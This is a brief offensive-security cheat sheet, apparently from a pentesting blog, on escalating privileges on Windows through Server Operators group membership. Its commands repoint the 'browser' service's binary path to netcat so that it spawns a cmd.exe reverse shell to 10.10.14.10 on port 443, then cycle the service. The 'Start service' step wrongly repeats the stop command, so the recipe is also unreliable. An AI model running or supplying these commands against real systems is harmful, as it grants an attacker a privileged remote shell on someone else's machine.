---
title: "Server Operators"
date: 2024-7-13
tags: ["server operators", "active driectory", "ad", "Windows", "privesc"]
---

---
### Server Operators

```bash
# Change a service path (e.g. browser)
sc.exe config browser binPath= "C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443"
```

```bash
# Stop service
sc.exe stop browser
```

```bash
# Start service
sc.exe stop browser
```

<br>